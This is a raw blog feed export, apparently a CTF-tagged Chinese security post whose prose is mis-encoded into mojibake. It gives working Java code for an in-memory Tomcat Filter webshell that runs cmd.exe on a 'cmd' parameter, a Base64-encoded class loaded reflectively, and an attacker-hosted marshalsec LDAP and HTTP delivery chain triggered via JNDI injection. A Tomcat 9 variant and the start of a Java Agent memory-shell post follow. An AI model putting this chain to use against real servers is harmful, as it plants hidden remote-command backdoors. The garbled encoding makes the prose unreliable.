è½½å‡ºæ¥</p><p>æ„å»ºæ¶æ„Filterç±»</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FilterShell</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest req, ServletResponse res, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">StringBuilder</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">            ProcessBuilder processBuilder;</span><br><span class="line">            processBuilder = <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> processBuilder.start();</span><br><span class="line">                <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream()));</span><br><span class="line">                String line;</span><br><span class="line">                <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                    output.append(line).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">            res.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line">            res.getWriter().println(output);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            chain.doFilter(req, res);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°†å…¶è¯¥ç±»å¯¼å‡ºä¸ºBase64å­—ç¬¦ä¸²ï¼Œä¾¿äºåœ¨æ— å‚æ„é€ æ–¹æ³•ä¸­è¿˜åŸå¹¶åŠ è½½</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dump</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NotFoundException, IOException, CannotCompileException &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.get(<span class="string">&quot;FilterShell&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = cc.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">encode</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(bytes);</span><br><span class="line">        System.out.println(encode);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”±äºJNDIæ³¨å…¥æ—¶æ‹¿ä¸åˆ°<code>Request</code>ã€<code>Response</code>å¯¹è±¡ï¼Œæˆ‘ä»¬éœ€è¦å¦ä¸€ä¸ªæ–¹æ³•è·å–<code>StandarContext</code>ï¼Œå¯¹äºTomcat8.0ç‰ˆæœ¬ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹è·å–</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">WebappClassLoaderBase</span> <span class="variable">webappClassLoaderBase</span> <span class="operator">=</span> (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line"><span class="type">StandardRoot</span> <span class="variable">standardRoot</span> <span class="operator">=</span> (StandardRoot) webappClassLoaderBase.getResources();</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standardRoot.getContext();</span><br></pre></td></tr></table></figure><p>å—å®³ç«¯åŠ è½½çš„ç±»å¯¹è±¡å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InjectClass</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">InjectClass</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException, NoSuchFieldException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">WebappClassLoaderBase</span> <span class="variable">webappClassLoaderBase</span> <span class="operator">=</span> (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line">        <span class="type">StandardRoot</span> <span class="variable">standardRoot</span> <span class="operator">=</span> (StandardRoot) webappClassLoaderBase.getResources();</span><br><span class="line">        <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standardRoot.getContext();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">sourceCode</span> <span class="operator">=</span> <span class="string">&quot;yv66vgAAADQAiwoAHQBPCABACwBQAFEHAFIKAAQATwcAUwcAVAgAVQgAVgoABgBXCgAGAFgHAFkHAFoKAFsAXAoADQBdCgAMAF4KAAwAXwoABABgCABhBwBiBwBjCgAVAGQIAGULAGYAZwsAZgBoCgBpAGoLAGsAbAcAbQcAbgcAbwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQANTEZpbHRlclNoZWxsOwEABGluaXQBAB8oTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOylWAQAMZmlsdGVyQ29uZmlnAQAcTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOwEACkV4Y2VwdGlvbnMHAHABAAhkb0ZpbHRlcgEAWyhMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7TGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47KVYBAAdwcm9jZXNzAQATTGphdmEvbGFuZy9Qcm9jZXNzOwEABnJlYWRlcgEAGExqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEABGxpbmUBABJMamF2YS9sYW5nL1N0cmluZzsBAAFlAQAVTGphdmEvaW8vSU9FeGNlcHRpb247AQAGb3V0cHV0AQAZTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEADnByb2Nlc3NCdWlsZGVyAQAaTGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcjsBAANyZXEBAB5MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDsBAANyZXMBAB9MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7AQAFY2hhaW4BABtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjsBAANjbWQBAA1TdGFja01hcFRhYmxlBwBtBwBxBwByBwBzBwBUBwBSBwBTBwB0BwBZBwBiAQAHZGVzdHJveQEAClNvdXJjZUZpbGUBABBGaWx0ZXJTaGVsbC5qYXZhDAAfACAHAHEMAHUAdgEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyAQAYamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyAQAQamF2YS9sYW5nL1N0cmluZwEAB2NtZC5leGUBAAIvYwwAHwB3DAB4AHkBABZqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyAQAZamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcgcAdAwAegB7DAAfAHwMAB8AfQwAfgB/DACAAIEBAAEKAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAGmphdmEvbGFuZy9SdW50aW1lRXhjZXB0aW9uDAAfAIIBABd0ZXh0L2h0bWw7Y2hhcnNldD1VVEYtOAcAcgwAgwCEDACFAIYHAIcMAIgAiQcAcwwALACKAQALRmlsdGVyU2hlbGwBABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YXgvc2VydmxldC9GaWx0ZXIBAB5qYXZheC9zZXJ2bGV0L1NlcnZsZXRFeGNlcHRpb24BABxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0AQAdamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2UBABlqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluAQARamF2YS9sYW5nL1Byb2Nlc3MBAAxnZXRQYXJhbWV0ZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEAGChMamF2YS9sYW5nL1Rocm93YWJsZTspVgEADnNldENvbnRlbnRUeXBlAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL09iamVjdDspVgEAQChMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7KVYAIQAcAB0AAQAeAAAABAABAB8AIAABACEAAAAvAAEAAQAAAAUqtwABsQAAAAIAIgAAAAYAAQAAAAYAIwAAAAwAAQAAAAUAJAAlAAAAAQAmACcAAgAhAAAANQAAAAIAAAABsQAAAAIAIgAAAAYAAQAAAAsAIwAAABYAAgAAAAEAJAAlAAAAAAABACgAKQABACoAAAAEAAEAKwABACwALQACACEAAAGhAAYACgAAAJkrEgK5AAMCADoEGQTGAIS7AARZtwAFOgW7AAZZBr0AB1kDEghTWQQSCVNZBRkEU7cACjoGGQa2AAs6B7sADFm7AA1ZGQe2AA63AA+3ABA6CBkItgARWToJxgATGQUZCbYAEhITtgASV6f/6KcADzoHuwAVWRkHtwAWvywSF7kAGAIALLkAGQEAGQW2ABqnAAstKyy5ABsDALEAAQA0AGsAbgAUAAMAIgAAAEIAEAAAAA8ACgAQAA8AEQAYABMANAAVADsAFgBQABgAWwAZAGsAHQBuABsAcAAcAHoAHgCCAB8AjQAgAJAAIQCYACMAIwAAAHAACwA7ADAALgAvAAcAUAAbADAAMQAIAFgAEwAyADMACQBwAAoANAA1AAcAGAB1ADYANwAFADQAWQA4ADkABgAAAJkAJAAlAAAAAACZADoAOwABAAAAmQA8AD0AAgAAAJkAPgA/AAMACgCPAEAAMwAEAEEAAAAwAAb/AFAACQcAQgcAQwcARAcARQcARgcARwcASAcASQcASgAA+QAaQgcASwv5ABUHACoAAAAGAAIAFAArAAEATAAgAAEAIQAAACsAAAABAAAAAbEAAAACACIAAAAGAAEAAAAnACMAAAAMAAEAAAABACQAJQAAAAEATQAAAAIATg==&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(sourceCode);</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">        method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Class&lt;?&gt; clazz = (Class&lt;?&gt;) method.invoke(classLoader, bytes, <span class="number">0</span>, bytes.length);</span><br><span class="line">        <span class="type">Filter</span> <span class="variable">filterShell</span> <span class="operator">=</span> (Filter) clazz.newInstance();</span><br><span class="line"></span><br><span class="line">        <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">        filterDef.setFilterName(<span class="string">&quot;FilterShell&quot;</span>);</span><br><span class="line">        filterDef.setFilter(filterShell);</span><br><span class="line">        filterDef.setFilterClass(filterShell.getClass().getName());</span><br><span class="line">        standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">        Constructor&lt;?&gt; constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">        filterMap.setFilterName(<span class="string">&quot;FilterShell&quot;</span>);</span><br><span class="line">        filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">        standardContext.addFilterMap(filterMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">filterConfigsField</span> <span class="operator">=</span> StandardContext.class.getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">        filterConfigsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Map&lt;String, ApplicationFilterConfig&gt; filterConfigs = (Map&lt;String, ApplicationFilterConfig&gt;) filterConfigsField.get(standardContext);</span><br><span class="line">        filterConfigs.put(<span class="string">&quot;FilterShell&quot;</span>, filterConfig);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°†<code>InjectClass</code>ç¼–è¯‘ä¸ºclassæ–‡ä»¶ï¼Œå¹¶æ‰˜ç®¡åœ¨æœåŠ¡å™¨ä¸Šï¼Œæˆ‘ä»¬éœ€è¦åœ¨æ”»å‡»è€…çš„æœåŠ¡å™¨ä¸Šæ­å»ºä¸€ä¸ªldapæœåŠ¡ï¼Œå¯ä»¥ä½¿ç”¨<code>marshalsec.jar</code>è¿›è¡Œï¼Œåœ¨æ”»å‡»è€…æœåŠ¡å™¨æ‰§è¡Œä»¥ä¸‹</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -Djava.net.preferIPv4Stack=<span class="literal">true</span> -<span class="built_in">cp</span> marshalsec.jar marshalsec.jndi.LDAPRefServer <span class="string">&quot;http://XXX.XXX.XXX.XXX/#InjectClass&quot;</span> 8080</span><br></pre></td></tr></table></figure><p>è¿˜éœ€è¦ä½¿ç”¨Pythonæ­å»ºä¸€ä¸ªhttpæœåŠ¡ï¼Œç”¨äºæä¾›classæ–‡ä»¶çš„ä¸‹è½½æœåŠ¡</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 3389</span><br></pre></td></tr></table></figure><p>è¿™ä¸¤ä¸ªæœåŠ¡ä¸­ï¼ŒmarshalsecæœåŠ¡è¿è¡Œåœ¨8080ç«¯å£ï¼Œåœ¨å—å®³ç«¯ä½¿ç”¨<code>ldap://XXX.XXX.XXX.XXX:8080/InjectClass</code>å°è¯•è®¿é—®ldapæœåŠ¡æ—¶ï¼Œmarshalsecä¼šå°†è¿è¡ŒhttpæœåŠ¡çš„3389ç«¯å£å‘Šè¯‰å—å®³ç«¯ï¼Œå—å®³ç«¯ä»3389ç«¯å£ä¸‹è½½classæ–‡ä»¶</p><p>æ­å»ºå®ŒæˆæœåŠ¡åï¼Œåœ¨å—å®³ç«¯çš„<code>/hello-servlet</code>è·¯ç”±ä¼ é€’<code>name=ldap://XXX.XXX.XXX.XXX:8080/InjectClass</code>å‚æ•°</p><p>æœåŠ¡å™¨èƒ½å¤Ÿæ¥æ”¶å—å®³ç«¯çš„classçš„ä¸‹è½½è¯·æ±‚</p><p><img src="/img/post/image-20260118153131270.png" alt="image-20260118153131270"></p><p>å—å®³ç«¯çš„ç•Œé¢ï¼š</p><p><img src="/img/post/image-20260118151930268.png" alt="image-20260118151930268"></p><p>è¿™ä¸ªé”™è¯¯ä¸æˆé—®é¢˜ï¼Œç”±äºJNDI è§„èŒƒè¦æ±‚å¦‚æœä¸€ä¸ªç±»ä½œä¸º <code>ObjectFactory</code> è¢«å¼•ç”¨ï¼Œå®ƒå¿…é¡»å®ç° <code>javax.naming.spi.ObjectFactory</code> æ¥å£ï¼Œä½†æ˜¯è¿™å‘ç”Ÿåœ¨æˆ‘ä»¬çš„æ¶æ„Filterå®ä¾‹åŒ–å¹¶æ³¨å†Œä¹‹åï¼ŒæŸ¥çœ‹Tomcatçš„æ§åˆ¶å°ç¡®å®æ‰“å°äº†successå­—æ ·</p><p><img src="/img/post/image-20260118151647617.png" alt="image-20260118151647617"></p><p>è¯´æ˜æˆ‘ä»¬çš„å†…å­˜é©¬æˆåŠŸè¢«å—å®³ç«¯è¿œç¨‹åŠ è½½å¹¶æ³¨å†Œäº†ï¼Œåœ¨ä»»æ„ç•Œé¢ä¼ å…¥cmdå‚æ•°ï¼Œä¹Ÿèƒ½å¤ŸæˆåŠŸæ‰§è¡Œå‘½ä»¤</p><p><img src="/img/post/image-20260118151744484.png" alt="image-20260118151744484"></p><br/><h2 id="Tomcat9-0ç‰ˆæœ¬è·å–StandarContext"><a href="#Tomcat9-0ç‰ˆæœ¬è·å–StandarContext" class="headerlink" title="Tomcat9.0ç‰ˆæœ¬è·å–StandarContext"></a>Tomcat9.0ç‰ˆæœ¬è·å–<code>StandarContext</code></h2><p>åœ¨å‰é¢çš„tomcat8.0ç¯å¢ƒä¸‹ï¼Œæˆ‘ä»¬é€šè¿‡è°ƒç”¨<code>WebappClassLoaderBase</code>çš„<code>getResources()</code>æ–¹æ³•è·å–<code>StandardRoot</code>è¿›è€Œè·å–<code>StandarContext</code>ï¼Œè€Œåœ¨Tomcat9.0ç‰ˆæœ¬ä¸­ï¼Œ<code>getResources()</code>æˆä¸ºäº†å¼ƒç”¨çš„æ–¹æ³•ï¼Œé»˜è®¤è¿”å›<code>null</code>å€¼</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Deprecated</span></span><br><span class="line">    <span class="keyword">public</span> WebResourceRoot <span class="title function_">getResources</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è€Œåœ¨Tomcat8.0ç¯å¢ƒä¸‹ï¼Œè¯¥æ–¹æ³•è¿”å›äº†<code>resources</code>å­—æ®µ</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> WebResourceRoot <span class="title function_">getResources</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.resources;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ä½†å…¶å®åœ¨Tomcat9.0ç¯å¢ƒä¸‹ï¼Œ<code>WebappClassLoaderBase</code>ä¹Ÿæ˜¯æœ‰<code>resources</code>å­—æ®µçš„ï¼Œåªä¸è¿‡ä¸å†èƒ½é€šè¿‡æŸä¸€ä¸ªæ–¹æ³•ç›´æ¥è·å–ï¼Œä½†æ˜¯è¿˜å¯ä»¥é€šè¿‡åå°„å–å¾—</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">WebappClassLoaderBase</span> <span class="variable">webappClassLoaderBase</span> <span class="operator">=</span> (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line">Class&lt;?&gt; webappClassLoaderBaseClass = webappClassLoaderBase.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">resources</span> <span class="operator">=</span>  webappClassLoaderBaseClass.getDeclaredField(<span class="string">&quot;resources&quot;</span>);</span><br><span class="line">resources.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standardRoot.getContext();</span><br></pre></td></tr></table></figure><br/>]]></content>
      
      
      <categories>
          
          <category> CTFç›¸å…³ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java AgentåŠå…¶å†…å­˜é©¬å®ç°</title>
      <link href="/2026/01/16/Agent%E5%8F%8A%E5%85%B6%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/"/>
      <url>/2026/01/16/Agent%E5%8F%8A%E5%85%B6%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="Java-AgentåŠå…¶å†…å­˜é©¬å®ç°"><a href="#Java-AgentåŠå…¶å†…å­˜é©¬å®ç°" class="headerlink" title="Java AgentåŠå…¶å†…å­˜é©¬å®ç°"></a>Java AgentåŠå…¶å†…å­˜é©¬å®ç°</h1><p>Java Agent æ˜¯ä¸€ç§å¯ä»¥åœ¨ Java è™šæ‹Ÿæœºï¼ˆJVMï¼‰å¯åŠ¨æ—¶æˆ–è¿è¡Œæ—¶åŠ è½½çš„ Java ç¨‹åºã€‚å®ƒé€šè¿‡ <code>java.lang.instrument</code> åŒ…æä¾›çš„æ¥å£è¿›è¡Œä»£ç æ’æ¡©ï¼Œä»è€Œåœ¨ Java åº”ç”¨ç¨‹åºçš„ç±»åŠ è½½å’Œè¿è¡ŒæœŸé—´æ”¹å˜ Java å­—èŠ‚ç </p><br/><h2 id="å…³äºAgent"><a href="#å…³äºAgent" class="headerlink" title="å…³äºAgent"></a>å…³äºAgent</h2><p>Agentçš„ä¸»è¦ç”¨é€”å°±æ˜¯ä¿®æ”¹ç¨‹åºçš„å­—èŠ‚ç æ–‡ä»¶ï¼Œé€šè¿‡å¤–æŒ‚çš„jaråŒ…å®ç°å¯¹ç¨‹åºjaråŒ…è¿›è¡Œä¿®æ”¹ã€‚Agentçš„è¿è¡Œæ–¹å¼æœ‰ä¸¤ç§ï¼Œä¸€ç§é€šè¿‡åœ¨ç¨‹åºåœ¨é€šè¿‡javaå‘½ä»¤å¯åŠ¨ç¨‹åºæ—¶é€šè¿‡åŠ å…¥<code>-javaagent</code>å‚æ•°æŒ‡å®šè¦åŠ è½½çš„agentï¼Œä¾‹å¦‚</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -javaagent:self-agent.jar -jar app.jar</span><br></pre></td></tr></table></figure><p>å¦ä¸€ç§æ–¹å¼æ˜¯åœ¨ç¨‹åºæ­£å¸¸å¯åŠ¨åå†è½½å…¥æˆ‘ä»¬çš„agentï¼Œè¿™ä¹Ÿæ˜¯é€šè¿‡agentå®ç°å†…å­˜é©¬çš„ä¸»è¦é€”å¾„</p><br/><h2 id="æ„å»ºAgentå¹¶æ‰§è¡Œ"><a href="#æ„å»ºAgentå¹¶æ‰§è¡Œ" class="headerlink" title="æ„å»ºAgentå¹¶æ‰§è¡Œ"></a>æ„å»ºAgentå¹¶æ‰§è¡Œ</h2><p>é€šè¿‡agentä¿®æ”¹å…¶ä»–åº”ç”¨ç¨‹åºçš„å­—èŠ‚ç æ–‡ä»¶ï¼Œéœ€è¦ä¸€ä¸ªåŒ…å«ä¿®æ”¹é€»è¾‘çš„jaråŒ…ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æ„å»ºä¸€ä¸ªæ–°çš„é¡¹ç›®ï¼Œå†å°†å…¶æ‰“åŒ…ä¸ºjaræ–‡ä»¶ï¼Œé¡¹ç›®ç»“æ„å¤§è‡´å¦‚ä¸‹</p><p><img src="/img/post/image-20260115175908677.png" alt="image-20260115175908677"></p><h3 id="æ–¹æ³•å…¥å£premainä¸agentmain"><a href="#æ–¹æ³•å…¥å£premainä¸agentmain" class="headerlink" title="æ–¹æ³•å…¥å£premainä¸agentmain"></a>æ–¹æ³•å…¥å£premainä¸agentmain</h3><p>åœ¨<code>Agent</code>ç±»ä¸­ï¼Œé€šè¿‡å®šä¹‰<code>premain()</code>å’Œ<code>agentmain()</code>æ–¹æ³•æ¥æŒ‡å®šjaråŒ…è¿è¡Œçš„å…¥å£ï¼Œä»¥ä¸Šä¸¤ä¸ªæ–¹æ³•åˆ†åˆ«å¯¹åº”é€šè¿‡å¯åŠ¨å‰æŒ‚è½½å’Œå¯åŠ¨åæŒ‚è½½ä¸¤ç§æ–¹å¼</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Agent</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">premain</span><span class="params">(String agentArgs, Instrumentation inst)</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String agentArgs, Instrumentation inst)</span> &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸¤æ–¹æ³•çš„å‚æ•°ä¸­ï¼Œ <code>agentArgs</code> æ¥æ”¶ä¼ é€’ç»™ Agent çš„å‚æ•°ï¼Œæ­¤å¤„å¯ä»¥ç”¨è¯¥å‚æ•°è¿›è¡Œè‡ªå®šä¹‰é€»è¾‘ã€‚æ¯”å¦‚ä½¿ç”¨å¯åŠ¨æ—¶æŒ‚è½½agentæ—¶æ‰§è¡Œä»¥ä¸‹å‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -javaagent:self-agent.jar=admin -jar app.jar</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶<code>agentArgs</code>æ¥æ”¶çš„å€¼å°†ä¼šæ˜¯<code>&quot;admin&quot;</code>è¿™ä¸ªå­—ç¬¦ä¸²</p><p><code>inst</code>å‚æ•°æ¥æ”¶ <code>Instrumentation</code> ç±»å‹çš„æ•°æ®ï¼Œè¿™å…¶å®æ˜¯ä¸€ä¸ªå·¥å…·å¯¹è±¡ï¼Œå¯ä»¥åˆ©ç”¨è¯¥å¯¹è±¡è¿›è¡Œä¸€äº›ç±»çš„é‡æ–°å®šä¹‰æ“ä½œæˆ–æ˜¯è½¬æ¢æ“ä½œ</p><h3 id="å…ƒæ•°æ®æ–‡ä»¶MANIFEST-MF"><a href="#å…ƒæ•°æ®æ–‡ä»¶MANIFEST-MF" class="headerlink" title="å…ƒæ•°æ®æ–‡ä»¶MANIFEST.MF"></a>å…ƒæ•°æ®æ–‡ä»¶MANIFEST.MF</h3><p>è¯¥æ–‡ä»¶çº¦æŸäº†jaråŒ…çš„ä¸€äº›è¡Œä¸ºï¼Œæœ‰ç‚¹ç±»ä¼¼äºé…ç½®æ–‡ä»¶ï¼Œé€šè¿‡è¯¥æ–‡ä»¶å¯ä»¥æŒ‡å®šjaråŒ…çš„å…¥å£ç±»ç­‰ç­‰ï¼Œè¯¥æ–‡ä»¶ä¸‹å¯ä»¥æœ‰ä»¥ä¸‹æ¡ç›®</p><table><thead><tr><th align="left">å±æ€§å</th><th align="left">è¯´æ˜</th><th align="left">å–å€¼</th><th align="left">é»˜è®¤å€¼</th><th align="left">é‡è¦æ€§</th></tr></thead><tbody><tr><td align="left"><strong>Premain-Class</strong></td><td align="left">é™æ€åŠ è½½ Agent çš„å…¥å£ç±» JVM å¯åŠ¨æ—¶é€šè¿‡ <code>-javaagent</code> å‚æ•°åŠ è½½</td><td align="left">å®Œæ•´ç±»åï¼Œå¦‚ï¼š<code>Agent</code></td><td align="left">æ— </td><td align="left"><strong>å¿…é¡»</strong>ï¼ˆé™æ€åŠ è½½æ—¶ï¼‰</td></tr><tr><td align="left"><strong>Agent-Class</strong></td><td align="left">åŠ¨æ€åŠ è½½ Agent çš„å…¥å£ç±» é€šè¿‡ <code>VirtualMachine.attach()</code> åœ¨è¿è¡Œæ—¶åŠ è½½</td><td align="left">å®Œæ•´ç±»åï¼Œå¦‚ï¼š<code>Agent</code></td><td align="left">æ— </td><td align="left"><strong>å¿…é¡»</strong>ï¼ˆåŠ¨æ€åŠ 